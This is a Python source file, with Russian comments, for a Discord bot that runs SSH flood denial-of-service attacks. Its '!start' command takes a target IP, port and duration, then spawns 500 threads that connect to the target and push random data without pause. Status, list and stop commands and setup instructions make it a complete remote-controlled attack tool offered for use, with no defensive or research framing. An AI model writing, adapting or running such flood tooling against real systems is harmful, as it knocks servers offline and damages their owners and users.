#!/usr/bin/env python3
import discord
from discord.ext import commands
import socket
import threading
import random
import string
import time
import asyncio
from concurrent.futures import ThreadPoolExecutor

# Токен бота (замени на свой)
BOT_TOKEN = ""
ADMIN_ROLE = "☾⭐☽ 【 Admin 】"  # Роль для доступа к командам
PREFIX = "!"

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

# Глобальные переменные для атак
active_attacks = {}
executor = ThreadPoolExecutor(max_workers=100)

def generate_random_data(size=1024):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()

def ssh_flood_worker(target_ip, target_port, duration, attack_id):
    """SSH флудер воркер"""
    end_time = time.time() + duration
    connections = 0
    
    def create_connection():
        nonlocal connections
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target_ip, target_port))
                sock.send(b'SSH-2.0-OpenSSH_8.9\r\n')
                
                while time.time() < end_time:
                    data = generate_random_data(random.randint(512, 2048))
                    sock.send(data)
                    time.sleep(0.001)
                sock.close()
                connections += 1
            except:
                pass
    
    threads = []
    for _ in range(500):
        t = threading.Thread(target=create_connection)
        t.daemon = True
        threads.append(t)
        t.start()
    
    # Отчет каждую секунду
    while time.time() < end_time:
        if attack_id in active_attacks:
            active_attacks[attack_id]['status'] = f"Подключений: {connections} | Осталось: {int(end_time - time.time())}с"
        time.sleep(1)
    
    if attack_id in active_attacks:
        active_attacks[attack_id]['status'] = f"Завершено. Подключений: {connections}"

@bot.event
async def on_ready():
    print(f'{bot.user} подключен и готов к атакам!')
    print("Команды: !start <ip> <port> <time> | !status | !stop <id> | !list")

@bot.command(name='start')
@commands.has_role(ADMIN_ROLE)
async def start_attack(ctx, ip: str, port: int, duration: int):
    """!start 192.168.1.100 22 60"""
    if duration <= 0 or port <= 0:
        await ctx.send("❌ Время/порт должны быть > 0")
        return
    
    attack_id = f"{ctx.author.id}_{int(time.time())}"
    active_attacks[attack_id] = {
        'ip': ip, 
        'port': port, 
        'duration': duration,
        'status': 'Запуск...',
        'channel': ctx.channel
    }
    
    await ctx.send(f"🚀 Атака **{attack_id}** запущена!\n"
                   f"🎯 Цель: `{ip}:{port}`\n"
                   f"⏱️ Время: `{duration}с`\n"
                   f"📊 Статус: `{active_attacks[attack_id]['status']}`")
    
    # Запуск в фоне
    loop = asyncio.get_event_loop()
    await loop.run_in_executor(executor, ssh_flood_worker, ip, port, duration, attack_id)

@bot.command(name='status')
@commands.has_role(ADMIN_ROLE)
async def attack_status(ctx):
    """Показывает статус всех атак"""
    if not active_attacks:
        await ctx.send("📭 Активных атак нет")
        return
    
    status_msg = "📊 **Активные атаки:**\n"
    for attack_id, data in active_attacks.items():
        status_msg += f"`{attack_id}`: {data['status']}\n"
    await ctx.send(status_msg)

@bot.command(name='list')
@commands.has_role(ADMIN_ROLE)
async def list_attacks(ctx):
    """!list - список атак"""
    await ctx.send("📋 **Список команд:**\n"
                   "`!start <ip> <port> <time>` - запуск\n"
                   "`!status` - статус атак\n"
                   "`!stop <id>` - остановка\n"
                   "`!list` - эта справка")

@bot.command(name='stop')
@commands.has_role(ADMIN_ROLE)
async def stop_attack(ctx, attack_id: str):
    """!stop attack_id - остановка атаки"""
    if attack_id in active_attacks:
        active_attacks[attack_id]['status'] = 'Остановлена'
        del active_attacks[attack_id]
        await ctx.send(f"🛑 Атака `{attack_id}` остановлена")
    else:
        await ctx.send("❌ Атака не найдена")

@bot.command(name='ping')
async def ping(ctx):
    await ctx.send("🏓 Pong!")

# Обработка ошибок прав
@start_attack.error
@attack_status.error
@stop_attack.error
@list_attacks.error
async def role_error(ctx, error):
    if isinstance(error, commands.MissingRole):
        await ctx.send("❌ Требуется роль **ADMIN**")

print("🤖 Discord SSH Flooder Bot запущен!")
print("1. Замени BOT_TOKEN на токен своего бота")
print("2. Создай роль ADMIN в Discord")
print("3. Запусти: python3 bot.py")
bot.run(BOT_TOKEN)